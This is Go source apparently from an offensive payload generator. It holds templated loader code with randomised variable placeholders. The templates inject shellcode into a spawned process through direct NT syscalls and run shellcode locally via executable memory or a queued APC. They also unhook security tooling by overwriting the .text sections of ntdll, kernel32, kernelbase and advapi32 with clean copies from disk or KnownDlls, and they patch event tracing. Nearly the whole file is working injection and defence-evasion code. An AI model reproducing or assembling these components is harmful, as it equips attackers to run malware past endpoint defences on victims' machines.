func {{.Variables.EnumProcessModules}}({{.Variables.process}} windows.Handle, {{.Variables.modules}} []windows.Handle) ({{.Variables.n}} int, {{.Variables.err}} error) {
	var {{.Variables.needed}} int32
	const {{.Variables.handleSize}} = unsafe.Sizeof({{.Variables.modules}}[0])
	r1, _, e1 := {{.Variables.procEnumProcessModules}}.Call(
		uintptr({{.Variables.process}}),
		uintptr(unsafe.Pointer(&{{.Variables.modules}}[0])),
		{{.Variables.handleSize}}*uintptr(len({{.Variables.modules}})),
		uintptr(unsafe.Pointer(&{{.Variables.needed}})),
	)
	if r1 == 0 {
		{{.Variables.err}} = errno(e1)
		return 0, {{.Variables.err}}
	}
	{{.Variables.n}} = int(uintptr({{.Variables.needed}}) / {{.Variables.handleSize}})
	return {{.Variables.n}}, nil
}



func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte) {
	{{.Variables.pi}} := {{.Variables.CreateProcess}}()
	{{.Variables.PPIDMessage}}
	time.Sleep(5 * time.Second)
	{{.Variables.hh}}, {{.Variables.err}} := windows.OpenProcess({{.Variables.PROCESS_ALL_ACCESS}}, false, {{.Variables.pi}}.ProcessId)
	if {{.Variables.err}} != nil {
	}
	{{.Variables.modules}} := make([]windows.Handle, 255)
	{{.Variables.n}}, {{.Variables.err}} := {{.Variables.EnumProcessModules}}({{.Variables.hh}}, {{.Variables.modules}})
	if {{.Variables.err}} != nil {
		fmt.Println(&SyscallError{"EnumProcessModules", {{.Variables.err}}})
	}
	if {{.Variables.n}} < len({{.Variables.modules}}) {
		{{.Variables.modules}} = {{.Variables.modules}}[:{{.Variables.n}}]
	}
	{{.Variables.RemoteReloading}}
	{{.Variables.ModuleMessage}}
	var {{.Variables.buf}} = make([]uint16, 255)
	for _, {{.Variables.mod}} := range {{.Variables.modules}} {
		{{.Variables.MI}}, _ := {{.Variables.GetModuleInformation}}({{.Variables.hh}}, {{.Variables.mod}})
		{{.Variables.n}}, {{.Variables.err}} := {{.Variables.GetModuleBaseName}}({{.Variables.hh}}, {{.Variables.mod}}, &{{.Variables.buf}}[0], uint32(len({{.Variables.buf}})))
		if {{.Variables.err}} != nil {
		}
		{{.Variables.s}} := windows.UTF16ToString({{.Variables.buf}}[:{{.Variables.n}}])
		if {{.Variables.s}} == "ntdll.dll" {
			{{.Variables.RemoteModuleEnumeration}}
			{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\ntdll.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			{{.Variables.RemoteModuleMessage}}
		}
		if {{.Variables.s}} == "KERNEL32.DLL" {
			{{.Variables.RemoteModuleEnumeration}}
			{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\kernel32.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			{{.Variables.RemoteModuleMessage}}
		}
		if {{.Variables.s}} == "KERNELBASE.dll" {
			{{.Variables.RemoteModuleEnumeration}}
			{{.Variables.RemoteModuleReloading}}("C:\\Windows\\System32\\kernelbase.dll", {{.Variables.MI}}.LpBaseOfDll, {{.Variables.hh}})
			{{.Variables.RemoteModuleMessage}}
		}
	}

	{{.Variables.RemoteETW}}({{.Variables.hh}})
	{{.Variables.Injecting}}
	{{.Variables.shellcode}}  := {{.Variables.raw_bin}}
	{{.Variables.oldProtect}} := windows.PAGE_READWRITE
	var {{.Variables.lpBaseAddress}} uintptr
	{{.Variables.size}} := len({{.Variables.shellcode}})

	{{.Variables.funcNtAllocateVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), 0, uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	{{.Variables.funcNtWriteVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), {{.Variables.lpBaseAddress}}, uintptr(unsafe.Pointer(&{{.Variables.shellcode}}[0])), uintptr({{.Variables.size}}), 0)

	{{.Variables.funcNtProtectVirtualMemory}}.Call(uintptr({{.Variables.pi}}.Process), uintptr(unsafe.Pointer(&{{.Variables.lpBaseAddress}})), uintptr(unsafe.Pointer(&{{.Variables.size}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Variables.oldProtect}})))

	{{.Variables.funcNtCreateThreadEx}}.Call(uintptr(unsafe.Pointer(&{{.Variables.pi}}.Thread)), windows.GENERIC_EXECUTE, 0, uintptr({{.Variables.pi}}.Process), {{.Variables.lpBaseAddress}}, {{.Variables.lpBaseAddress}}, 0, 0, 0, 0, 0)

	syscall.CloseHandle({{.Variables.pi}}.Thread)

	{{.Variables.Injected}}
}
func {{.Variables.RemoteModuleReloading}}({{.Variables.name}} string, {{.Variables.addr}} uintptr, {{.Variables.handle}} windows.Handle) error {
	{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.name}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.name}})
	if {{.Variables.error}} != nil {
		return {{.Variables.error}}
	}
	{{.Variables.x}} := {{.Variables.file}}.Section(".text")
	{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
	{{.Variables.dllBase}} := {{.Variables.addr}}
	{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
	{{.Variables.rawbytes}} := fmt.Sprintf("%X", {{.Variables.bytes}})
	{{.Variables.data}}, _ := hex.DecodeString(string({{.Variables.rawbytes}}))
	{{.Variables.regionsize}} := len({{.Variables.bytes}})
	{{.Variables.offsetaddr}} := uintptr({{.Variables.dllOffset}})
	var {{.Variables.nLength}} uintptr
	{{.Variables.WriteProcessMemory}}(uintptr({{.Variables.handle}}), {{.Variables.offsetaddr}}, &{{.Variables.data}}[0], uintptr(uint32({{.Variables.regionsize}})), &{{.Variables.nLength}})

	return nil
}
`
}

func Syscall_Alloc() string {
	return `
	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){
		var {{.Variables.phandle}} uint64
		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
		{{.Variables.phandle}} = 0xffffffffffffffff
		{{.Variables.regionsizep}} := len({{.Variables.raw_bin}})
		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
		{{.Variables.protect}} = 0x40
		{{.Variables.alloctype}} = 0x3000
		{{.Variables.AllocatingMessage}}
		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
		for x, y := range []byte({{.Variables.raw_bin}}) {
			{{.Variables.buff}} [x] = y
		}
		{{.Variables.SyscallMessage}}
		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0,)
	}
	`
}

func Syscall_RtlCopy() string {
	return `
	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){
		{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll.dll")
		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32")
		{{.Variables.RtlCopyMemory}} := {{.Variables.ntdll}}.NewProc("RtlCopyMemory")
		{{.Variables.VirtualAlloc}} := {{.Variables.kernel32}}.NewProc("VirtualAlloc")

		var {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
		var {{.Variables.oldptrperms}} uintptr
		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
		{{.Variables.regionsize}} := uintptr(len({{.Variables.raw_bin}}))
		{{.Variables.protect}} = 0x40
		{{.Variables.alloctype}} = 0x3000
		{{.Variables.ptr}}, _, _ := {{.Variables.VirtualAlloc}}.Call(0, uintptr(len({{.Variables.raw_bin}})), {{.Variables.alloctype}}, {{.Variables.protect}})

		{{.Variables.RtlCopyMemoryMessage}}
		{{.Variables.RtlCopyMemory}}.Call({{.Variables.ptr}}, (uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}[0])), uintptr(len({{.Variables.raw_bin}})))
		{{.Variables.VirtualProtectMessage}}



		[loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}},
			{{.Variables.handle}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
			&{{.Variables.regionsize}},
			0x20,
			&{{.Variables.oldptrperms}},
			)
		{{.Variables.SyscallMessage}}
		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0)
	}
`
}

func Syscall_NtQueueAPCThreadEx_Local() string {
	return `
	const (
		QUEUE_USER_APC_FLAGS_NONE = iota
		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
		QUEUE_USER_APC_FLGAS_MAX_VALUE
	)


	func {{.Variables.FunctionName}}({{.Variables.raw_bin}} []byte){

		{{.Variables.kernel32}} := windows.NewLazySystemDLL("kernel32.dll")
		{{.Variables.ntdll}} := windows.NewLazySystemDLL("ntdll.dll")
		{{.Variables.RtlCopyMemory}} := {{.Variables.ntdll}}.NewProc("RtlCopyMemory")
		{{.Variables.NtQueueApcThreadEx}} := {{.Variables.ntdll}}.NewProc("NtQueueApcThreadEx")
		{{.Variables.GetCurrentThread}} := {{.Variables.kernel32}}.NewProc("GetCurrentThread")

		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
		var {{.Variables.phandle}} uint64
		var {{.Variables.oldptrperms}} uintptr
		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
		{{.Variables.phandle}} = 0xffffffffffffffff
		{{.Variables.regionsize}} := uintptr(len({{.Variables.raw_bin}}))
		{{.Variables.protect}} = 0x40
		{{.Variables.alloctype}} = 0x3000
		{{.Variables.AllocatingMessage}}
		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, uintptr({{.Variables.regionsize}}), {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
		{{.Variables.RtlCopyMemoryMessage}}
		{{.Variables.RtlCopyMemory}}.Call({{.Variables.ptr}}, (uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}[0])), uintptr(len({{.Variables.raw_bin}})))
		{{.Variables.VirtualProtectMessage}}
		[loader].[NtProtectVirtualMemoryprep](
			{{.Variables.customsyscallVP}},
			{{.Variables.handle}},
			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
			&{{.Variables.regionsize}},
			0x20,
			&{{.Variables.oldptrperms}},
			)
		{{.Variables.GetCurrentThreadMessage}}
		{{.Variables.thread}}, _, _ := {{.Variables.GetCurrentThread}}.Call()
		{{.Variables.NtQueueApcThreadExMessage}}
		{{.Variables.NtQueueApcThreadEx}}.Call({{.Variables.thread}}, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr({{.Variables.ptr}}), 0, 0, 0)

	}
`
}

func Disk_Refresh() string {
	return `
		func {{.Variables.Reloading}} error {
			{{.Variables.DLLname}} := []string{string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})}

			for i, _ := range {{.Variables.DLLname}} {
				{{.Variables.ReloadingMessage}}
				{{.Variables.dll}}, {{.Variables.error}} := ioutil.ReadFile({{.Variables.DLLname}}[i])
				if {{.Variables.error}} != nil {
					return {{.Variables.error}}
				}
				{{.Variables.file}}, {{.Variables.error}} := pe.Open({{.Variables.DLLname}}[i])
				if {{.Variables.error}} != nil {
					return {{.Variables.error}}
				}
				{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
				{{.Variables.bytes}} := {{.Variables.dll}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
				{{.Variables.loaddll}}, {{.Variables.error}} := windows.LoadDLL({{.Variables.DLLname}}[i])
				if {{.Variables.error}} != nil {
					return {{.Variables.error}}
				}
				{{.Variables.handle}} := {{.Variables.loaddll}}.Handle
				{{.Variables.dllBase}} := uintptr({{.Variables.handle}})
				{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.x}}.VirtualAddress)
				{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
				{{.Variables.handlez}} := uintptr(0xffffffffffffffff)
				var {{.Variables.oldfartcodeperms}} uintptr
				{{.Variables.Address}} := {{.Variables.FindAddress}}()

				{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryJMPprep](
					{{.Variables.customsyscallVP}},
					{{.Variables.Address}},
					{{.Variables.handlez}},
					(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
					&{{.Variables.regionsize}},
					0x40,
					&{{.Variables.oldfartcodeperms}},
				)
				if {{.Variables.runfunc}} != 0 {
				}
				for i := 0; i < len({{.Variables.bytes}}); i++ {
					{{.Variables.loc}} := uintptr({{.Variables.dllOffset}} + uint(i))
					{{.Variables.mem}} := (*[1]byte)(unsafe.Pointer({{.Variables.loc}}))
					(*{{.Variables.mem}})[0] = {{.Variables.bytes}}[i]
				}
				{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryJMPprep](
					{{.Variables.customsyscallVP}},
					{{.Variables.Address}},
					{{.Variables.handlez}},
					(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
					&{{.Variables.regionsize}},
					0x20,
					&{{.Variables.oldfartcodeperms}},
				)
			}
			return nil
		}


	`
}

func KnownDLL_Refresh() string {
	return `
		var {{.Variables.NtOpenSection}}      uint16
		var {{.Variables.NtMapViewOfSection}} uint16
		var {{.Variables.mxKeSFQASvbvx}}      uint16
		func {{.Variables.Reloading}}  {
			{{.Variables.DLLname}} := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}

	 	for i, _ := range {{.Variables.DLLname}} {
			KnownDLL({{.Variables.DLLname}}[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}

		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}

		func KnownDLL({{.Variables.DLL}}  string) []byte {
			{{.Variables.ReloadingMessage}}
			var {{.Variables.KnownDll}} , {{.Variables.sztViewSize}} , {{.Variables.CleanSystemDLL}}  uintptr
			{{.Variables.handle}} := uintptr(0xffffffffffffffff)
			{{.Variables.ntPathW}} := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + {{.Variables.DLL}}
			{{.Variables.ntPath}}, _ := windows.NewNTUnicodeString({{.Variables.ntPathW}})
			{{.Variables.objectAttributes}} := windows.OBJECT_ATTRIBUTES{}
			{{.Variables.objectAttributes}}.Attributes = 0x00000040
			{{.Variables.objectAttributes}}.ObjectName = {{.Variables.ntPath}}
			{{.Variables.objectAttributes}}.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			{{.Variables.Address}} := {{.Variables.FindAddress}}()
			{{.Variables.NtOpenSection}} = 0x37
			{{.Variables.ttttt}} := 0x0004
			r, _ := [loader].[NtOpenSectionprep](
				{{.Variables.NtOpenSection}},
				{{.Variables.Address}},
				uintptr(unsafe.Pointer(&{{.Variables.KnownDll}})),
				uintptr({{.Variables.ttttt}}),
				uintptr(unsafe.Pointer(&{{.Variables.objectAttributes}})),
			)
			if r != 0 {
			}
			{{.Variables.NtMapViewOfSection}} = 0x28
			zero := 0
			one := 1
			[loader].[NtOpenSection](
				{{.Variables.NtMapViewOfSection}},
				{{.Variables.Address}},
				{{.Variables.KnownDll}},
				{{.Variables.handle}},
				uintptr(unsafe.Pointer(&{{.Variables.CleanSystemDLL}})),
				uintptr(zero),
				uintptr(zero),
				uintptr(zero),
				uintptr(unsafe.Pointer(&{{.Variables.sztViewSize}})),
				uintptr(one),
				uintptr(zero),
				uintptr(syscall.PAGE_READONLY),
			)
			{{.Variables.rawdata}} := rawreader.New({{.Variables.CleanSystemDLL}}, int({{.Variables.sztViewSize}}))
			{{.Variables.file}}, _ := pe.NewFileFromMemory({{.Variables.rawdata}})
			{{.Variables.fullbytes}}, err := {{.Variables.file}}.Bytes()
			if err != nil {
			}
			{{.Variables.x}} := {{.Variables.file}}.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			{{.Variables.bytes}} := {{.Variables.fullbytes}}[{{.Variables.x}}.Offset:{{.Variables.x}}.Size]
			{{.Variables.filee}}, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  {{.Variables.DLL}} )
			if error != nil {
			}
			{{.Variables.xx}} := {{.Variables.filee}}.Section(".text")
			{{.Variables.loaddlll}}, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  {{.Variables.DLL}} )
			if error != nil {
			}
			{{.Variables.ddhandlez}} := {{.Variables.loaddlll}}.Handle
			{{.Variables.dllBase}}  := uintptr({{.Variables.ddhandlez}})
			{{.Variables.dllOffset}} := uint({{.Variables.dllBase}}) + uint({{.Variables.xx}}.VirtualAddress)
			{{.Variables.mxKeSFQASvbvx}} = 0x50
			{{.Variables.regionsize}} := uintptr(len({{.Variables.bytes}}))
			var {{.Variables.oldfartcodeperms}} uintptr

			{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryJMPprep](
				{{.Variables.mxKeSFQASvbvx}},
				{{.Variables.Address}},
				{{.Variables.handle}},
				(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
				&{{.Variables.regionsize}},
				0x40,
				&{{.Variables.oldfartcodeperms}},
			)
			if {{.Variables.runfunc}} != 0 {
			}
			{{.Variables.WriteMemoryfunc}}({{.Variables.bytes}}, uintptr({{.Variables.dllOffset}}))
			{{.Variables.filee}}.Close()
			{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryJMPprep](
				{{.Variables.mxKeSFQASvbvx}},
				{{.Variables.Address}},
				{{.Variables.handle}},
				(*uintptr)(unsafe.Pointer(&{{.Variables.dllOffset}})),
				&{{.Variables.regionsize}},
				0x20,
				&{{.Variables.oldfartcodeperms}},
			)
			if {{.Variables.runfunc}} != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr({{.Variables.handle}}), {{.Variables.CleanSystemDLL}}, 0)
			return {{.Variables.bytes}}
		}


		func {{.Variables.WriteMemoryfunc}}({{.Variables.inbuf}} []byte, {{.Variables.destination}} uintptr) {
			for {{.Variables.index}} := uint32(0); {{.Variables.index}} < uint32(len({{.Variables.inbuf}})); {{.Variables.index}}++ {
				{{.Variables.writePtr}} := unsafe.Pointer({{.Variables.destination}} + uintptr({{.Variables.index}}))
				{{.Variables.v}} := (*byte)({{.Variables.writePtr}})
				*{{.Variables.v}} = {{.Variables.inbuf}}[{{.Variables.index}}]
			}
		}

	`
}
